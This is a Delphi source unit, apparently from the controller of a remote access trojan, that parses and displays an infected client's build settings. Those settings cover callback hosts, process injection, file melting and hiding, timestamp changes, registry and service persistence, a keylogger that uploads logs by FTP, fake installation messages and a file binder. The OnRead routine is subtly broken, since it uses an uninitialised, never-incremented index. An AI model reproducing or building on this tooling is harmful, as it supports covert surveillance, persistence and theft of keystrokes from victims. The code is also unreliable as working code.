unit UnitMoreInfos;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ComCtrls, StdCtrls, UnitConnection, IniFiles, IdTCPServer;

type
  TFormMoreInfos = class(TForm)
    pgc1: TPageControl;
    ts1: TTabSheet;
    ts2: TTabSheet;
    lv1: TListView;
    mmo1: TMemo;
  protected
    procedure CreateParams(var Params: TCreateParams) ; override;
  private
    { Private declarations }
    Client: PConnectionDatas;
    procedure ShowClientConfiguration(Clientconfiguration: string);
  public
    { Public declarations }    
    constructor Create(aOwner: TComponent; ConnDatas: PConnectionDatas);
    procedure OnRead(AThread: TIdPeerThread; ReceivedDatas: string);
  end;

var
  FormMoreInfos: TFormMoreInfos;

implementation

uses
  UnitConstants, UnitCountry, UnitFunctions;

{$R *.dfm}
    
constructor TFormMoreInfos.Create(aOwner: TComponent; ConnDatas: PConnectionDatas);
begin
  inherited Create(aOwner);
  Client := ConnDatas;
end;

procedure TFormMoreInfos.CreateParams(var Params: TCreateParams) ;
begin
  inherited;
  Params.ExStyle := Params.ExStyle or WS_EX_APPWINDOW;
  Params.WndParent := 0;
end;
     
procedure TFormMoreInfos.OnRead(AThread: TIdPeerThread; ReceivedDatas: string);
var
  TmpStr: string;
  i: Integer;
begin
  TmpStr := Copy(ReceivedDatas, 1, Pos(DELIMITER, ReceivedDatas)-1);
  Delete(ReceivedDatas, 1, Pos(DELIMITER, ReceivedDatas));
  ShowClientConfiguration(TmpStr);

  while ReceivedDatas <> '' do
  begin
    lv1.Items[i].SubItems[0] := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
    Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
  end;

  lv1.Items[2].SubItems[0] := GetCountryName(lv1.Items[2].SubItems[0]);
end;

procedure TFormMoreInfos.ShowClientConfiguration(Clientconfiguration: string);
var
  i: Integer;
  _Hosts: array [0..4] of string;
  _Ports: array [0..4] of Word;
  _FTPOptions, _MessageParams: array[0..3] of string;
  _StartupOptions: Integer;
  _Delay, _FTPPort, _FTPDelay: Word;
  _ClientId, _StartupKey, _Password, _ServiceDesc, _MutexName,_ClientConfig,
  _ServiceName, _Foldername, _FileName, _Destination, _InjectInto: string;
  _FakeMessage, _Install, _Keylogger, _Melt, _Startup,
  _Hide, _WaitReboot, _ChangeDate, _HKCUStartup, _HKLMStartup,
  _PoliciesStartup, _Persistence, _FTPLogs, _Binded: Boolean;
begin
  _Hosts[0] := Copy(Clientconfiguration, 1, Pos('#', Clientconfiguration)-1);
  Delete(Clientconfiguration, 1, Pos('#', Clientconfiguration));
  _Hosts[1] := Copy(Clientconfiguration, 1, Pos('#', Clientconfiguration)-1);
  Delete(Clientconfiguration, 1, Pos('#', Clientconfiguration));
  _Hosts[2] := Copy(Clientconfiguration, 1, Pos('#', Clientconfiguration)-1);
  Delete(Clientconfiguration, 1, Pos('#', Clientconfiguration));
  _Hosts[3] := Copy(Clientconfiguration, 1, Pos('#', Clientconfiguration)-1);
  Delete(Clientconfiguration, 1, Pos('#', Clientconfiguration));
  _Hosts[4] := Copy(Clientconfiguration, 1, Pos('#', Clientconfiguration)-1);
  Delete(Clientconfiguration, 1, Pos('#', Clientconfiguration));
  Delete(Clientconfiguration, 1, Pos('|', Clientconfiguration));

  _Ports[0] := StrToInt(Copy(Clientconfiguration, 1, Pos('#', Clientconfiguration)-1));
  Delete(Clientconfiguration, 1, Pos('#', Clientconfiguration));
  _Ports[1] := StrToInt(Copy(Clientconfiguration, 1, Pos('#', Clientconfiguration)-1));
  Delete(Clientconfiguration, 1, Pos('#', Clientconfiguration));
  _Ports[2] := StrToInt(Copy(Clientconfiguration, 1, Pos('#', Clientconfiguration)-1));
  Delete(Clientconfiguration, 1, Pos('#', Clientconfiguration));
  _Ports[3] := StrToInt(Copy(Clientconfiguration, 1, Pos('#', Clientconfiguration)-1));
  Delete(Clientconfiguration, 1, Pos('#', Clientconfiguration));
  _Ports[4] := StrToInt(Copy(Clientconfiguration, 1, Pos('#', Clientconfiguration)-1));
  Delete(Clientconfiguration, 1, Pos('#', Clientconfiguration));
  Delete(Clientconfiguration, 1, Pos('|', Clientconfiguration));

  _FTPOptions[0] := Copy(Clientconfiguration, 1, Pos('#', Clientconfiguration)-1);
  Delete(Clientconfiguration, 1, Pos('#', Clientconfiguration));
  _FTPOptions[1] := Copy(Clientconfiguration, 1, Pos('#', Clientconfiguration)-1);
  Delete(Clientconfiguration, 1, Pos('#', Clientconfiguration));
  _FTPOptions[2] := Copy(Clientconfiguration, 1, Pos('#', Clientconfiguration)-1);
  Delete(Clientconfiguration, 1, Pos('#', Clientconfiguration));
  _FTPOptions[3] := Copy(Clientconfiguration, 1, Pos('#', Clientconfiguration)-1);
  Delete(Clientconfiguration, 1, Pos('#', Clientconfiguration));
  Delete(Clientconfiguration, 1, Pos('|', Clientconfiguration));

  _MessageParams[0] := Copy(Clientconfiguration, 1, Pos('#', Clientconfiguration)-1);
  Delete(Clientconfiguration, 1, Pos('#', Clientconfiguration));
  _MessageParams[1] := Copy(Clientconfiguration, 1, Pos('#', Clientconfiguration)-1);
  Delete(Clientconfiguration, 1, Pos('#', Clientconfiguration));
  _MessageParams[2] := Copy(Clientconfiguration, 1, Pos('#', Clientconfiguration)-1);
  Delete(Clientconfiguration, 1, Pos('#', Clientconfiguration));
  _MessageParams[3] := Copy(Clientconfiguration, 1, Pos('#', Clientconfiguration)-1);
  Delete(Clientconfiguration, 1, Pos('#', Clientconfiguration));
  Delete(Clientconfiguration, 1, Pos('|', Clientconfiguration));

  _StartupOptions := StrToInt(Copy(Clientconfiguration, 1, Pos('|', Clientconfiguration)-1));
  Delete(Clientconfiguration, 1, Pos('|', Clientconfiguration));
  _Delay := StrToInt(Copy(Clientconfiguration, 1, Pos('|', Clientconfiguration)-1));
  Delete(Clientconfiguration, 1, Pos('|', Clientconfiguration));
  _FTPPort := StrToInt(Copy(Clientconfiguration, 1, Pos('|', Clientconfiguration)-1));
  Delete(Clientconfiguration, 1, Pos('|', Clientconfiguration));
  _FTPDelay := StrToInt(Copy(Clientconfiguration, 1, Pos('|', Clientconfiguration)-1));
  Delete(Clientconfiguration, 1, Pos('|', Clientconfiguration));

  _ClientId := Copy(Clientconfiguration, 1, Pos('|', Clientconfiguration)-1);
  Delete(Clientconfiguration, 1, Pos('|', Clientconfiguration));  
  _StartupKey := Copy(Clientconfiguration, 1, Pos('|', Clientconfiguration)-1);
  Delete(Clientconfiguration, 1, Pos('|', Clientconfiguration));
  _Password := Copy(Clientconfiguration, 1, Pos('|', Clientconfiguration)-1);
  Delete(Clientconfiguration, 1, Pos('|', Clientconfiguration));
  _ServiceDesc := Copy(Clientconfiguration, 1, Pos('|', Clientconfiguration)-1);
  Delete(Clientconfiguration, 1, Pos('|', Clientconfiguration));
  _MutexName := Copy(Clientconfiguration, 1, Pos('|', Clientconfiguration)-1);
  Delete(Clientconfiguration, 1, Pos('|', Clientconfiguration));
  _ServiceName := Copy(Clientconfiguration, 1, Pos('|', Clientconfiguration)-1);
  Delete(Clientconfiguration, 1, Pos('|', Clientconfiguration));
  _Foldername := Copy(Clientconfiguration, 1, Pos('|', Clientconfiguration)-1);
  Delete(Clientconfiguration, 1, Pos('|', Clientconfiguration));   
  _FileName := Copy(Clientconfiguration, 1, Pos('|', Clientconfiguration)-1);
  Delete(Clientconfiguration, 1, Pos('|', Clientconfiguration));    
  _Destination := Copy(Clientconfiguration, 1, Pos('|', Clientconfiguration)-1);
  Delete(Clientconfiguration, 1, Pos('|', Clientconfiguration));
  _InjectInto := Copy(Clientconfiguration, 1, Pos('|', Clientconfiguration)-1);
  Delete(Clientconfiguration, 1, Pos('|', Clientconfiguration)); 
  _FakeMessage := MyStrToBool(Copy(Clientconfiguration, 1, Pos('|', Clientconfiguration)-1));
  Delete(Clientconfiguration, 1, Pos('|', Clientconfiguration)); 
  _Install := MyStrToBool(Copy(Clientconfiguration, 1, Pos('|', Clientconfiguration)-1));
  Delete(Clientconfiguration, 1, Pos('|', Clientconfiguration));
  _Keylogger := MyStrToBool(Copy(Clientconfiguration, 1, Pos('|', Clientconfiguration)-1));
  Delete(Clientconfiguration, 1, Pos('|', Clientconfiguration));
  _Melt := MyStrToBool(Copy(Clientconfiguration, 1, Pos('|', Clientconfiguration)-1));
  Delete(Clientconfiguration, 1, Pos('|', Clientconfiguration));
  _Startup := MyStrToBool(Copy(Clientconfiguration, 1, Pos('|', Clientconfiguration)-1));
  Delete(Clientconfiguration, 1, Pos('|', Clientconfiguration));  
  _Hide := MyStrToBool(Copy(Clientconfiguration, 1, Pos('|', Clientconfiguration)-1));
  Delete(Clientconfiguration, 1, Pos('|', Clientconfiguration));      
  _WaitReboot := MyStrToBool(Copy(Clientconfiguration, 1, Pos('|', Clientconfiguration)-1));
  Delete(Clientconfiguration, 1, Pos('|', Clientconfiguration));
  _ChangeDate := MyStrToBool(Copy(Clientconfiguration, 1, Pos('|', Clientconfiguration)-1));
  Delete(Clientconfiguration, 1, Pos('|', Clientconfiguration));
  _HKCUStartup := MyStrToBool(Copy(Clientconfiguration, 1, Pos('|', Clientconfiguration)-1));
  Delete(Clientconfiguration, 1, Pos('|', Clientconfiguration));
  _HKLMStartup := MyStrToBool(Copy(Clientconfiguration, 1, Pos('|', Clientconfiguration)-1));
  Delete(Clientconfiguration, 1, Pos('|', Clientconfiguration));    
  _PoliciesStartup := MyStrToBool(Copy(Clientconfiguration, 1, Pos('|', Clientconfiguration)-1));
  Delete(Clientconfiguration, 1, Pos('|', Clientconfiguration));
  _Persistence := MyStrToBool(Copy(Clientconfiguration, 1, Pos('|', Clientconfiguration)-1));
  Delete(Clientconfiguration, 1, Pos('|', Clientconfiguration));
  _FTPLogs := MyStrToBool(Copy(Clientconfiguration, 1, Pos('|', Clientconfiguration)-1));
  Delete(Clientconfiguration, 1, Pos('|', Clientconfiguration));
  _Binded := MyStrToBool(Clientconfiguration);

  mmo1.Lines.Clear;
  mmo1.Lines.Add(JustL('Main settings', 0));
  mmo1.Lines.Add('');
  mmo1.Lines.Add(JustL('  Client identification', 35) + _ClientId);
  mmo1.Lines.Add(JustL('  Connection password', 35) + _Password);
  mmo1.Lines.Add(JustL('  Process injection', 35) + _InjectInto);
  mmo1.Lines.Add(JustL('  Process mutex', 35) + _MutexName);
  mmo1.Lines.Add('');
  mmo1.Lines.Add(JustL('Network', 0));

  for i := 0 to 4 do
  mmo1.Lines.Add(JustL('  Client host[' + IntToStr(i) + ']', 35) +
    _Hosts[i] + ':' + IntToStr(_Ports[i]));

  mmo1.Lines.Add(JustL('  Connection delay', 35) + IntToStr(_Delay));
  mmo1.Lines.Add('');
  mmo1.Lines.Add(JustL('Installation', 0));
  mmo1.Lines.Add('');
  mmo1.Lines.Add(JustL('  Install client on system', 35) + MyBoolToStr(_Install));
  mmo1.Lines.Add(JustL('  Destination file', 35) + _Destination);
  mmo1.Lines.Add(JustL('  Folder name', 35) + _Foldername);
  mmo1.Lines.Add(JustL('  Filename', 35) + _FileName);
  mmo1.Lines.Add(JustL('  Melt file after installation', 35) + MyBoolToStr(_Melt));
  mmo1.Lines.Add(JustL('  Change folder and filename time', 35) + MyBoolToStr(_ChangeDate));
  mmo1.Lines.Add(JustL('  Hide folder and filename', 35) + MyBoolToStr(_Hide));
  mmo1.Lines.Add(JustL('  Enable keylogger', 35) + MyBoolToStr(_Keylogger));
  mmo1.Lines.Add(JustL('  Wait for system reboot', 35) + MyBoolToStr(_WaitReboot));
  mmo1.Lines.Add(JustL('  Persistence installation', 35) + MyBoolToStr(_Persistence));
  mmo1.Lines.Add('');
  mmo1.Lines.Add(JustL('Startup', 0));
  mmo1.Lines.Add('');

  if _StartupOptions = 0 then
    mmo1.Lines.Add(JustL('  Registry startup', 35) + 'Yes')
  else mmo1.Lines.Add(JustL('  Registry startup', 35) + 'No');

  mmo1.Lines.Add(JustL('  HKCU', 35) + MyBoolToStr(_HKCUStartup));
  mmo1.Lines.Add(JustL('  HKLM', 35) + MyBoolToStr(_HKLMStartup));
  mmo1.Lines.Add(JustL('  Policies', 35) + MyBoolToStr(_PoliciesStartup));
  mmo1.Lines.Add(JustL('  Registry key name', 35) + _StartupKey);
  mmo1.Lines.Add('');

  if _StartupOptions = 1 then
    mmo1.Lines.Add(JustL('  Service startup', 35) + 'Yes')
  else  mmo1.Lines.Add(JustL('  Service startup', 35) + 'No');

  mmo1.Lines.Add(JustL('  Service name', 35) + _ServiceName);
  mmo1.Lines.Add(JustL('  Service description', 35) + _ServiceDesc);
  mmo1.Lines.Add('');
  mmo1.Lines.Add(JustL('Keylogger', 0));
  mmo1.Lines.Add('');
  mmo1.Lines.Add(JustL('  Send keylogs by FTP', 35) + MyBoolToStr(_FTPLogs));
  mmo1.Lines.Add(JustL('  FTP host', 35) + _FTPOptions[0]);
  mmo1.Lines.Add(JustL('  FTP port', 35) + IntToStr(_FTPPort));
  mmo1.Lines.Add(JustL('  FTP uername', 35) + _FTPOptions[1]);
  mmo1.Lines.Add(JustL('  FTP password', 35) + _FTPOptions[2]);
  mmo1.Lines.Add(JustL('  FTP directory', 35) + _FTPOptions[3]);
  mmo1.Lines.Add(JustL('  Send keylogs every', 35) + IntToStr(_FTPDelay) + ' minutes');
  mmo1.Lines.Add('');
  mmo1.Lines.Add(JustL('Fake message', 0));
  mmo1.Lines.Add(''); 
  mmo1.Lines.Add(JustL('  Show a fake installation message', 35) +
    MyBoolToStr(_FakeMessage));
  mmo1.Lines.Add(JustL('  Message title', 35) + _MessageParams[0]);
  mmo1.Lines.Add(JustL('  Message text', 35) + _MessageParams[1]);    
  mmo1.Lines.Add('');
  mmo1.Lines.Add(JustL('Binder', 0));
  mmo1.Lines.Add('');
  mmo1.Lines.Add(JustL('  Bind client with files', 35) + MyBoolToStr(_Binded));
end;

end.
